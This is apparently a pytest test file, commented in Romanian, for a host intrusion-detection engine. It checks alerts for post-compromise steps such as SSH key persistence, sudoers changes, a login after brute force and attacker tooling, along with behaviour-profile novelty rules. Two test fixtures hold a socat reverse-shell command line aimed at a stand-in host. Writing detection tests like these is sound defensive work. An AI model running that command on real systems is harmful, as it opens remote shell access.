"""Detecția post-compromitere și profilul de comportament.

Testul care contează cel mai mult e ultimul: un scenariu complet de intruziune,
pas cu pas, care verifică nu că fiecare regulă funcționează izolat, ci că
lanțul produce alerte la momentele în care un operator ar avea nevoie de ele.
"""
from __future__ import annotations

import asyncio
from datetime import datetime, timedelta, timezone
from types import SimpleNamespace

import pytest

from sentinel.detect import intrusion, novelty
from sentinel.detect.rules import RULES
from sentinel.predict import behaviour as bh

NOW = datetime(2026, 8, 6, 3, 14, tzinfo=timezone.utc)


def run(c):
    return asyncio.run(c)


class _DB:
    """Întoarce rânduri programate pe potrivire de text în SQL."""

    def __init__(self, rows=None, vals=None):
        self.rows, self.vals = rows or {}, vals or {}
        self.sql: list[str] = []

    def _pick(self, table, sql, default=None):
        for k, v in table.items():
            if k in sql:
                return v
        return default

    async def fetch(self, sql, *a):
        self.sql.append(sql)
        v = self._pick(self.rows, sql, [])
        return v(*a) if callable(v) else v

    async def fetchrow(self, sql, *a):
        self.sql.append(sql)
        v = self._pick(self.rows, sql)
        if isinstance(v, list):
            return v[0] if v else None
        return v

    async def fetchval(self, sql, *a):
        self.sql.append(sql)
        v = self._pick(self.vals, sql, 0)
        return v(*a) if callable(v) else v

    async def execute(self, sql, *a):
        self.sql.append(sql)


def _row(**kw):
    base = {"action": "ssh_key_change", "n": 1, "paths": None, "procs": None,
            "users": None, "event_ids": [1], "first_ts": NOW, "last_ts": NOW,
            "sample": {}}
    base.update(kw)
    return base


# --- regulile de post-compromitere ----------------------------------------
def test_a_single_ssh_key_write_is_critical():
    """Fără prag de volum. O cheie scrisă în authorized_keys e acces care
    supraviețuiește schimbării parolei — a doua nu adaugă nimic la ce trebuie
    să știi."""
    db = _DB(rows={"e.source = 'auditd'": [_row(
        action="ssh_key_change", n=1, paths=["/root/.ssh/authorized_keys"],
        procs=["/usr/bin/tee"], users=["1000"])]})
    specs = run(intrusion.persistence(db, 0))
    assert len(specs) == 1
    assert specs[0].severity == "critical"
    assert "authorized_keys" in specs[0].summary


def test_intrusion_rules_never_produce_a_blockable_address():
    """Fapta e pe gazdă. Adresa care a scris cheia poate fi 127.0.0.1 sau poate
    lipsi; a bloca ceva pe baza ei ar însemna, în cel mai rău caz, să te
    blochezi pe tine."""
    db = _DB(rows={"e.source = 'auditd'": [_row(action="sudoers_change")]})
    for spec in run(intrusion.privilege_escalation(db, 0)):
        assert spec.src_ip is None
        assert spec.actor_key == "host"


def test_a_successful_login_after_a_burst_of_failures_is_critical():
    """Restul motorului alertează pe cele 200 de încercări eșuate. Asta
    alertează pe a 201-a — singura care contează."""
    db = _DB(rows={"WITH ok AS": [{
        "ip": "203.0.113.47", "username": "root", "geo_country": "DE",
        "geo_asn": 200651, "ok_id": 99, "ok_ts": NOW, "fails": 214,
        "first_fail": NOW - timedelta(minutes=7), "fail_ids": [1, 2, 3]}]})
    specs = run(intrusion.successful_login_after_bruteforce(db, 0))
    assert len(specs) == 1
    s = specs[0]
    assert s.severity == "critical"
    assert "REUȘITĂ" in s.title
    assert "214" in s.summary
    assert s.evidence["fails_before"] == 214


def test_a_reverse_shell_command_line_reaches_the_alert():
    """`socat` singur nu deosebește un reverse shell de un script de
    administrare. Argumentele o fac."""
    db = _DB(rows={"suspicious_exec": [{
        "id": 7, "ts": NOW, "process": "/usr/bin/socat", "username": "33",
        "raw": {"argv": "socat TCP:198.51.100.9:4444 EXEC:/bin/bash"}}]})
    specs = run(intrusion.attacker_tooling(db, 0))
    assert specs[0].severity == "critical"
    assert "4444" in specs[0].summary


def test_curl_is_high_not_critical():
    """Îl folosește toată lumea. Ridicat la critic ar face alerta despre socat
    să valoreze la fel de puțin."""
    db = _DB(rows={"suspicious_exec": [{
        "id": 8, "ts": NOW, "process": "/usr/bin/curl", "username": "33",
        "raw": {}}]})
    assert run(intrusion.attacker_tooling(db, 0))[0].severity == "high"


def test_webroot_tampering_asks_the_disambiguating_question():
    """Regula cu cel mai mare potențial de fals-pozitive din fișier. Textul
    trebuie să spună operatorului ce să verifice, nu doar ce s-a întâmplat."""
    db = _DB(rows={"e.source = 'auditd'": [_row(
        action="webroot_change", n=3, paths=["/var/www/html/x.php"])]})
    s = run(intrusion.webroot_tampering(db, 0))[0]
    assert s.severity == "high"
    assert "deploy" in s.summary.lower()


# --- profilul de comportament ---------------------------------------------
def _learning(dimension, *, days, obs, distinct, warm=None):
    return {"started_at": NOW - timedelta(days=days), "observations": obs,
            "distinct_keys": distinct, "warm_at": warm}


def test_a_dimension_needs_both_days_and_observations():
    """ȘI, nu SAU. Numai zilele: un server oprit trei zile ar deveni cald fără
    să fi văzut nimic. Numai observațiile: o mie de autentificări într-o oră
    spun ce se întâmplă într-o oră, nu ce e normal marți dimineața."""
    dim = bh.BY_NAME["login_user"]
    cases = [
        (_learning("login_user", days=10, obs=5, distinct=3), False, "prea puține observații"),
        (_learning("login_user", days=0.5, obs=999, distinct=9), False, "prea puține zile"),
        (_learning("login_user", days=10, obs=999, distinct=1), False, "o singură cheie"),
        (_learning("login_user", days=10, obs=999, distinct=3), True, "ambele praguri"),
    ]
    for row, expect_warm, why in cases:
        db = _DB(rows={"FROM behaviour_learning": row})
        promoted = run(bh._promote_warm(db))
        assert (("login_user" in promoted) is expect_warm), why


def test_an_already_warm_dimension_is_not_re_promoted():
    """Persistat, nu recalculat: retenția taie observațiile vechi, iar o
    dimensiune caldă nu are voie să redevină rece — ar fi o a doua perioadă
    oarbă, exact când profilul e cel mai valoros."""
    db = _DB(rows={"FROM behaviour_learning":
                   _learning("login_user", days=99, obs=1, distinct=1, warm=NOW)})
    assert run(bh._promote_warm(db)) == []


def test_novelty_is_silent_while_the_dimension_is_learning():
    """Fără poarta asta, prima zi ar produce o alertă pentru fiecare utilizator,
    fiecare rețea și fiecare binar de pe server — adică sute, iar operatorul ar
    învăța din prima zi să ignore canalul."""
    db = _DB(vals={"warm_at IS NOT NULL": False},
             rows={"FROM behaviour_profiles": [
                 {"key": "atacator", "first_seen": NOW, "observations": 1}]})
    assert run(novelty.unseen_before(db, 0)) == []


def test_a_new_key_on_a_warm_dimension_alerts_once_per_key():
    db = _DB(vals={"warm_at IS NOT NULL": True, "count(*)": 4,
                   "EXTRACT(EPOCH": 21.0},
             rows={"FROM behaviour_profiles": [
                 {"key": "ro-backup", "first_seen": NOW, "observations": 1},
                 {"key": "svc-deploy", "first_seen": NOW, "observations": 1}]})
    specs = run(novelty.unseen_before(db, 0))
    prints = {s.fingerprint for s in specs}
    # Două valori noi = două incidente, nu unul actualizat.
    assert len(prints) == len(specs)
    assert any("ro-backup" in s.title for s in specs)


def test_acknowledged_keys_stop_alerting():
    """Marcarea e o decizie umană, vizibilă în tabelă. Un profil care ar învăța
    tăcut din propriile alerte ar putea fi antrenat de atacator."""
    sql_seen: list[str] = []

    class DB(_DB):
        async def fetch(self, sql, *a):
            sql_seen.append(sql)
            return []

    run(novelty._fresh_keys(DB(), "login_user"))
    assert any("acknowledged = false" in s for s in sql_seen)


# --- schimbarea bruscă de compoziție --------------------------------------
@pytest.mark.parametrize(
    "now_new,mean,buckets,expected,why",
    [
        (8, 0.1, 400, True,  "rafală față de o dimensiune liniștită"),
        (2, 0.1, 400, False, "sub minimul absolut, oricât de mare ar fi multiplul"),
        (8, 6.0, 400, False, "dimensiune care oricum descoperă chei noi des"),
        (8, 0.1, 5,   False, "prea puțin istoric ca media să însemne ceva"),
    ])
def test_composition_shift_thresholds(now_new, mean, buckets, expected, why):
    db = _DB(vals={"warm_at IS NOT NULL": True},
             rows={"WITH cur AS": {"now_new": now_new, "mean": mean,
                                   "buckets": buckets},
                   "FROM behaviour_profiles": []})
    specs = run(novelty.composition_shift(db, 0))
    assert bool(specs) is expected, why


# --- ordinea în motor -----------------------------------------------------
def test_learning_runs_before_the_rules_that_read_the_profile():
    """`observe()` scrie profilul; regulile citesc cheile pe care tocmai le-a
    creat. Inversat, o cheie ar fi ratată dacă serviciul cade între cei doi
    pași, sau re-alertată la nesfârșit dacă nu cade."""
    names = [r.__name__ for r in RULES]
    assert names.index("_learn") < names.index("unseen_before")
    assert names.index("_learn") < names.index("composition_shift")


def test_the_attempt_rules_still_run():
    """Post-compromiterea se ADAUGĂ, nu înlocuiește."""
    names = {r.__name__ for r in RULES}
    assert {"ssh_bruteforce", "web_enumeration", "suricata_alert",
            "volume_anomaly"} <= names


# --- scenariul complet ----------------------------------------------------
def test_a_full_intrusion_produces_alerts_at_each_stage():
    """Parola ghicită, cheie lăsată, privilegii luate, unealtă adusă.

    Testul nu verifică o regulă, ci că lanțul produce o alertă în fiecare
    moment în care operatorul ar avea nevoie de una. Înainte, singura alertă din
    toată secvența era pentru încercările EȘUATE de la început."""
    stages = []

    # 1. a intrat
    db = _DB(rows={"WITH ok AS": [{
        "ip": "203.0.113.47", "username": "deploy", "geo_country": "RU",
        "geo_asn": 12345, "ok_id": 1, "ok_ts": NOW, "fails": 180,
        "first_fail": NOW - timedelta(minutes=9), "fail_ids": [1]}]})
    stages += run(intrusion.successful_login_after_bruteforce(db, 0))

    # 2. și-a lăsat cheia
    db = _DB(rows={"e.source = 'auditd'": [_row(
        action="ssh_key_change", paths=["/root/.ssh/authorized_keys"])]})
    stages += run(intrusion.persistence(db, 0))

    # 3. și-a luat root
    db = _DB(rows={"e.source = 'auditd'": [_row(
        action="sudoers_change", paths=["/etc/sudoers.d/x"])]})
    stages += run(intrusion.privilege_escalation(db, 0))

    # 4. și-a adus unealta
    db = _DB(rows={"suspicious_exec": [{
        "id": 4, "ts": NOW, "process": "/usr/bin/socat", "username": "0",
        "raw": {"argv": "socat TCP:198.51.100.9:4444 EXEC:/bin/bash"}}]})
    stages += run(intrusion.attacker_tooling(db, 0))

    assert len(stages) == 4, "fiecare etapă trebuie să producă o alertă"
    assert all(s.severity == "critical" for s in stages)
    # Amprente distincte: patru incidente separate, nu unul actualizat de patru
    # ori. Operatorul trebuie să vadă progresia, nu ultima stare.
    assert len({s.fingerprint for s in stages}) == 4
